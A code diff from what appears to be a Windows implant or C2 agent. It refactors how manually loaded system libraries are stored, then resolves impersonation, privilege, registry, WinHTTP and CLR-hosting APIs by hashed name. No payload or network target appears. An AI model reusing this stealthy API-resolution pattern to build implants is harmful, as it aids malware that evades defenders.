@@ -268,51 +268,48 @@ namespace Main {
 		x_assertb(F_PTR_HMOD(ctx->win32.FreeResource, 							ctx->modules.kernel32, FREERESOURCE));
 		x_assertb(F_PTR_HMOD(ctx->win32.SetProcessValidCallTargets, 			ctx->modules.kernbase, SETPROCESSVALIDCALLTARGETS));
 
-		// TODO: Memory leak for heap-allocated EXECUTABLE*. Only need DllBase and free the module entry.
-		x_assertb(ctx->modules.shlwapi	= (HMODULE) ImportModule(LoadLocalFile, SHLWAPI, nullptr, 0, nullptr, false)->base);
-        x_assertb(ctx->modules.crypt32  = (HMODULE) ImportModule(LoadLocalFile, CRYPT32, nullptr, 0, nullptr, false)->base);
-        x_assertb(ctx->modules.winhttp  = (HMODULE) ImportModule(LoadLocalFile, WINHTTP, nullptr, 0, nullptr, false)->base);
-        x_assertb(ctx->modules.advapi   = (HMODULE) ImportModule(LoadLocalFile, ADVAPI32, nullptr, 0, nullptr, false)->base);
-        x_assertb(ctx->modules.iphlpapi = (HMODULE) ImportModule(LoadLocalFile, IPHLPAPI, nullptr, 0, nullptr, false)->base);
-        x_assertb(ctx->modules.mscoree  = (HMODULE) ImportModule(LoadLocalFile, MSCOREE, nullptr, 0, nullptr, false)->base);
+		//TODO: these loaded libraries will need mod->base. Everything else can be freed.
+		x_assertb(ctx->modules.dload->shlwapi  = ImportModule(LoadLocalFile, SHLWAPI, nullptr, 0, nullptr, false));
+        x_assertb(ctx->modules.dload->crypt32  = ImportModule(LoadLocalFile, CRYPT32, nullptr, 0, nullptr, false));
+        x_assertb(ctx->modules.dload->winhttp  = ImportModule(LoadLocalFile, WINHTTP, nullptr, 0, nullptr, false));
+        x_assertb(ctx->modules.dload->advapi   = ImportModule(LoadLocalFile, ADVAPI32, nullptr, 0, nullptr, false));
+        x_assertb(ctx->modules.dload->iphlpapi = ImportModule(LoadLocalFile, IPHLPAPI, nullptr, 0, nullptr, false));
+        x_assertb(ctx->modules.dload->mscoree  = ImportModule(LoadLocalFile, MSCOREE, nullptr, 0, nullptr, false));
 
-		x_assertb(F_PTR_HMOD(ctx->win32.GetUserNameA, 							ctx->modules.advapi, GETUSERNAMEA));
-		x_assertb(F_PTR_HMOD(ctx->win32.LookupAccountSidW, 						ctx->modules.advapi, LOOKUPACCOUNTSIDW));
-		x_assertb(F_PTR_HMOD(ctx->win32.LookupPrivilegeValueA, 					ctx->modules.advapi, LOOKUPPRIVILEGEVALUEA));
-		x_assertb(F_PTR_HMOD(ctx->win32.AddMandatoryAce, 						ctx->modules.advapi, ADDMANDATORYACE));
-		x_assertb(F_PTR_HMOD(ctx->win32.SetEntriesInAclA, 						ctx->modules.advapi, SETENTRIESINACLA));
-		x_assertb(F_PTR_HMOD(ctx->win32.AllocateAndInitializeSid, 				ctx->modules.advapi, ALLOCATEANDINITIALIZESID));
-		x_assertb(F_PTR_HMOD(ctx->win32.InitializeSecurityDescriptor, 			ctx->modules.advapi, INITIALIZESECURITYDESCRIPTOR));
-		x_assertb(F_PTR_HMOD(ctx->win32.SetSecurityDescriptorDacl, 				ctx->modules.advapi, SETSECURITYDESCRIPTORDACL));
-		x_assertb(F_PTR_HMOD(ctx->win32.SetSecurityDescriptorSacl, 				ctx->modules.advapi, SETSECURITYDESCRIPTORSACL));
-		x_assertb(F_PTR_HMOD(ctx->win32.InitializeAcl, 							ctx->modules.advapi, INITIALIZEACL));
-		x_assertb(F_PTR_HMOD(ctx->win32.FreeSid, 								ctx->modules.advapi, FREESID));
-		x_assertb(F_PTR_HMOD(ctx->win32.ImpersonateLoggedOnUser, 				ctx->modules.advapi, IMPERSONATELOGGEDONUSER));
-		x_assertb(F_PTR_HMOD(ctx->win32.AdjustTokenPrivileges, 					ctx->modules.advapi, ADJUSTTOKENPRIVILEGES));
-		x_assertb(F_PTR_HMOD(ctx->win32.RegOpenKeyExA, 							ctx->modules.advapi, REGOPENKEYEXA));
-		x_assertb(F_PTR_HMOD(ctx->win32.RegCreateKeyExA, 						ctx->modules.advapi, REGCREATEKEYEXA));
-		x_assertb(F_PTR_HMOD(ctx->win32.RegSetValueExA, 						ctx->modules.advapi, REGSETVALUEEXA));
-		x_assertb(F_PTR_HMOD(ctx->win32.RegCloseKey, 							ctx->modules.advapi, REGCLOSEKEY));
-
-		x_assertb(F_PTR_HMOD(ctx->win32.GetAdaptersInfo, 						ctx->modules.iphlpapi, GETADAPTERSINFO));
-		x_assertb(F_PTR_HMOD(ctx->win32.CLRCreateInstance, 						ctx->modules.mscoree, CLRCREATEINSTANCE));
-
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpOpen, 							ctx->modules.winhttp, WINHTTPOPEN));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpConnect, 					    ctx->modules.winhttp, WINHTTPCONNECT));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpOpenRequest, 					ctx->modules.winhttp, WINHTTPOPENREQUEST));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpAddRequestHeaders, 				ctx->modules.winhttp, WINHTTPADDREQUESTHEADERS));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpSetOption, 						ctx->modules.winhttp, WINHTTPSETOPTION));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpGetProxyForUrl, 					ctx->modules.winhttp, WINHTTPGETPROXYFORURL));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpGetIEProxyConfigForCurrentUser, 	ctx->modules.winhttp, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpSendRequest, 					ctx->modules.winhttp, WINHTTPSENDREQUEST));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpReceiveResponse, 				ctx->modules.winhttp, WINHTTPRECEIVERESPONSE));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpReadData, 						ctx->modules.winhttp, WINHTTPREADDATA));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpQueryHeaders, 					ctx->modules.winhttp, WINHTTPQUERYHEADERS));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpQueryDataAvailable, 				ctx->modules.winhttp, WINHTTPQUERYDATAAVAILABLE));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpCloseHandle, 					ctx->modules.winhttp, WINHTTPCLOSEHANDLE));
-
-		x_assertb(F_PTR_HMOD(ctx->win32.CryptStringToBinaryA, 					ctx->modules.crypt32, CRYPTSTRINGTOBINARYA));
-		x_assertb(F_PTR_HMOD(ctx->win32.CryptBinaryToStringA, 					ctx->modules.crypt32, CRYPTBINARYTOSTRINGA));
+		x_assertb(F_PTR_HMOD(ctx->win32.GetUserNameA, 							(HMODULE)ctx->modules.dload->advapi->base, GETUSERNAMEA));
+		x_assertb(F_PTR_HMOD(ctx->win32.LookupAccountSidW, 						(HMODULE)ctx->modules.dload->advapi->base, LOOKUPACCOUNTSIDW));
+		x_assertb(F_PTR_HMOD(ctx->win32.LookupPrivilegeValueA, 					(HMODULE)ctx->modules.dload->advapi->base, LOOKUPPRIVILEGEVALUEA));
+		x_assertb(F_PTR_HMOD(ctx->win32.AddMandatoryAce, 						(HMODULE)ctx->modules.dload->advapi->base, ADDMANDATORYACE));
+		x_assertb(F_PTR_HMOD(ctx->win32.SetEntriesInAclA, 						(HMODULE)ctx->modules.dload->advapi->base, SETENTRIESINACLA));
+		x_assertb(F_PTR_HMOD(ctx->win32.AllocateAndInitializeSid, 				(HMODULE)ctx->modules.dload->advapi->base, ALLOCATEANDINITIALIZESID));
+		x_assertb(F_PTR_HMOD(ctx->win32.InitializeSecurityDescriptor, 			(HMODULE)ctx->modules.dload->advapi->base, INITIALIZESECURITYDESCRIPTOR));
+		x_assertb(F_PTR_HMOD(ctx->win32.SetSecurityDescriptorDacl, 				(HMODULE)ctx->modules.dload->advapi->base, SETSECURITYDESCRIPTORDACL));
+		x_assertb(F_PTR_HMOD(ctx->win32.SetSecurityDescriptorSacl, 				(HMODULE)ctx->modules.dload->advapi->base, SETSECURITYDESCRIPTORSACL));
+		x_assertb(F_PTR_HMOD(ctx->win32.InitializeAcl, 							(HMODULE)ctx->modules.dload->advapi->base, INITIALIZEACL));
+		x_assertb(F_PTR_HMOD(ctx->win32.FreeSid, 								(HMODULE)ctx->modules.dload->advapi->base, FREESID));
+		x_assertb(F_PTR_HMOD(ctx->win32.ImpersonateLoggedOnUser, 				(HMODULE)ctx->modules.dload->advapi->base, IMPERSONATELOGGEDONUSER));
+		x_assertb(F_PTR_HMOD(ctx->win32.AdjustTokenPrivileges, 					(HMODULE)ctx->modules.dload->advapi->base, ADJUSTTOKENPRIVILEGES));
+		x_assertb(F_PTR_HMOD(ctx->win32.RegOpenKeyExA, 							(HMODULE)ctx->modules.dload->advapi->base, REGOPENKEYEXA));
+		x_assertb(F_PTR_HMOD(ctx->win32.RegCreateKeyExA, 						(HMODULE)ctx->modules.dload->advapi->base, REGCREATEKEYEXA));
+		x_assertb(F_PTR_HMOD(ctx->win32.RegSetValueExA, 						(HMODULE)ctx->modules.dload->advapi->base, REGSETVALUEEXA));
+		x_assertb(F_PTR_HMOD(ctx->win32.RegCloseKey, 							(HMODULE)ctx->modules.dload->advapi->base, REGCLOSEKEY));
+		x_assertb(F_PTR_HMOD(ctx->win32.GetAdaptersInfo, 						(HMODULE)ctx->modules.dload->iphlpapi->base, GETADAPTERSINFO));
+		x_assertb(F_PTR_HMOD(ctx->win32.CLRCreateInstance, 						(HMODULE)ctx->modules.dload->mscoree->base, CLRCREATEINSTANCE));
+		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpOpen, 							(HMODULE)ctx->modules.dload->winhttp->base, WINHTTPOPEN));
+		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpConnect, 					    (HMODULE)ctx->modules.dload->winhttp->base, WINHTTPCONNECT));
+		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpOpenRequest, 					(HMODULE)ctx->modules.dload->winhttp->base, WINHTTPOPENREQUEST));
+		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpAddRequestHeaders, 				(HMODULE)ctx->modules.dload->winhttp->base, WINHTTPADDREQUESTHEADERS));
+		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpSetOption, 						(HMODULE)ctx->modules.dload->winhttp->base, WINHTTPSETOPTION));
+		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpGetProxyForUrl, 					(HMODULE)ctx->modules.dload->winhttp->base, WINHTTPGETPROXYFORURL));
+		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpGetIEProxyConfigForCurrentUser, 	(HMODULE)ctx->modules.dload->winhttp->base, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER));
+		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpSendRequest, 					(HMODULE)ctx->modules.dload->winhttp->base, WINHTTPSENDREQUEST));
+		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpReceiveResponse, 				(HMODULE)ctx->modules.dload->winhttp->base, WINHTTPRECEIVERESPONSE));
+		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpReadData, 						(HMODULE)ctx->modules.dload->winhttp->base, WINHTTPREADDATA));
+		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpQueryHeaders, 					(HMODULE)ctx->modules.dload->winhttp->base, WINHTTPQUERYHEADERS));
+		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpQueryDataAvailable, 				(HMODULE)ctx->modules.dload->winhttp->base, WINHTTPQUERYDATAAVAILABLE));
+		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpCloseHandle, 					(HMODULE)ctx->modules.dload->winhttp->base, WINHTTPCLOSEHANDLE));
+		x_assertb(F_PTR_HMOD(ctx->win32.CryptStringToBinaryA, 					(HMODULE)ctx->modules.dload->crypt32->base, CRYPTSTRINGTOBINARYA));
+		x_assertb(F_PTR_HMOD(ctx->win32.CryptBinaryToStringA, 					(HMODULE)ctx->modules.dload->crypt32->base, CRYPTBINARYTOSTRINGA));
 
         defer:
 		return success;
